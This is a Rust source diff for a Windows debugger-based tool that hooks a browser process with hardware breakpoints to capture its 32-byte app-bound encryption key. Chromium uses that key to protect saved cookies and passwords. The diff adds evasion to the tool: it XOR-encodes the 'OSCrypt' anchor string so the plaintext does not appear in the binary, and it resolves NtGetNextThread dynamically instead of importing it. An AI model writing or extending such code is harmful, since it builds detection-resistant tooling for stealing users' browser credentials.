@@ -1,6 +1,8 @@
-use std::mem::zeroed;
+use std::mem::{transmute, zeroed};
+use std::sync::OnceLock;
 use std::time::{Duration, Instant};
 
+use windows::core::{s, w};
 use windows::Win32::Foundation::{
     CloseHandle, DBG_CONTINUE, DBG_EXCEPTION_NOT_HANDLED, EXCEPTION_BREAKPOINT,
     EXCEPTION_SINGLE_STEP, HANDLE,
@@ -11,13 +13,34 @@ use windows::Win32::System::Diagnostics::Debug::{
     CREATE_THREAD_DEBUG_EVENT, DEBUG_EVENT, EXCEPTION_DEBUG_EVENT, EXIT_PROCESS_DEBUG_EVENT,
     LOAD_DLL_DEBUG_EVENT, LOAD_DLL_DEBUG_INFO,
 };
+use windows::Win32::System::LibraryLoader::{GetModuleHandleW, GetProcAddress};
 use windows::Win32::System::Threading::{OpenThread, ResumeThread, SuspendThread, THREAD_ALL_ACCESS};
 
 use crate::db::KeyCandidate;
 use crate::mem;
 use crate::pe;
 
-const ANCHOR: &[u8] = b"OSCrypt.AppBoundProvider.Decrypt.ResultCode\0";
+const ANCHOR_KEY: u8 = 0x37;
+const ANCHOR_ENC: [u8; 44] = [
+    0x78, 0x64, 0x74, 0x45, 0x4e, 0x47, 0x43, 0x19, 0x76, 0x47, 0x47, 0x75,
+    0x58, 0x42, 0x59, 0x53, 0x67, 0x45, 0x58, 0x41, 0x5e, 0x53, 0x52, 0x45,
+    0x19, 0x73, 0x52, 0x54, 0x45, 0x4e, 0x47, 0x43, 0x19, 0x65, 0x52, 0x44,
+    0x42, 0x5b, 0x43, 0x74, 0x58, 0x53, 0x52, 0x37,
+];
+
+fn anchor_key() -> u8 {
+    // Route the key through a runtime pointer load (black-boxed) so the
+    // compiler cannot constant-fold the whole transform and re-emit the
+    // plaintext anchor in .rdata.
+    let key: [u8; 1] = [ANCHOR_KEY];
+    let p = std::hint::black_box(&key[0] as *const u8);
+    unsafe { *p }
+}
+
+fn decrypt_anchor() -> Vec<u8> {
+    let key = anchor_key();
+    ANCHOR_ENC.iter().map(|b| b ^ key).collect()
+}
 
 const KEY_LEN: usize = 32;
 /// Hardware debug registers provide four execution breakpoints.
@@ -37,18 +60,19 @@ const CAPTURE_WINDOW: Duration = Duration::from_secs(30);
 #[repr(C, align(16))]
 struct AlignedContext(CONTEXT);
 
-// Walk the debuggee's threads like the original tool's default path
-// (NtGetNextThread). A toolhelp thread snapshot enumerates every thread in
-// the system and can deadlock while the debuggee is frozen mid-load.
-extern "system" {
-    fn NtGetNextThread(
-        hprocess: HANDLE,
-        hthread: HANDLE,
-        flags: u32,
-        desired_access: u32,
-        handle_attributes: u32,
-        next: *mut HANDLE,
-    ) -> i32;
+/// Walk the debuggee's threads like the original tool's default path
+/// (NtGetNextThread). A toolhelp thread snapshot enumerates every thread in
+/// the system and can deadlock while the debuggee is frozen mid-load.
+type NtGetNextThreadFn =
+    unsafe extern "system" fn(HANDLE, HANDLE, u32, u32, u32, *mut HANDLE) -> i32;
+
+fn nt_get_next_thread() -> Option<NtGetNextThreadFn> {
+    static FN: OnceLock<Option<NtGetNextThreadFn>> = OnceLock::new();
+    *FN.get_or_init(|| unsafe {
+        let ntdll = GetModuleHandleW(w!("ntdll.dll")).ok()?;
+        let address = GetProcAddress(ntdll, s!("NtGetNextThread"))?;
+        Some(transmute(address))
+    })
 }
 
 /// Write the given breakpoint sites into the thread's debug registers
@@ -120,12 +144,16 @@ fn arm_thread(hthread: HANDLE, slots: &[usize]) {
 
 /// Returns the number of threads the breakpoints were actually set on.
 fn arm_on_debuggee_threads(hprocess: HANDLE, slots: &[usize]) -> usize {
+    let Some(get_next_thread) = nt_get_next_thread() else {
+        crate::log_err!("[-] NtGetNextThread is unavailable; cannot arm breakpoints");
+        return 0;
+    };
     let mut armed = 0;
     let mut previous = HANDLE::default();
     loop {
         let mut next = HANDLE::default();
         let status = unsafe {
-            NtGetNextThread(hprocess, previous, THREAD_ALL_ACCESS.0, 0, 0, &mut next)
+            get_next_thread(hprocess, previous, THREAD_ALL_ACCESS.0, 0, 0, &mut next)
         };
         if !previous.is_invalid() {
             unsafe { let _ = CloseHandle(previous); };
@@ -218,7 +246,8 @@ fn collect_candidates(hprocess: HANDLE, ctx: &CONTEXT, candidates: &mut Vec<KeyC
 }
 
 fn locate_breakpoints(hprocess: HANDLE, base: usize) -> Vec<usize> {
-    let Some(string_va) = pe::find_pattern(hprocess, base, ANCHOR) else {
+    let anchor = decrypt_anchor();
+    let Some(string_va) = pe::find_pattern(hprocess, base, &anchor) else {
         return Vec::new();
     };
     pe::find_lea_xrefs(hprocess, base, string_va)
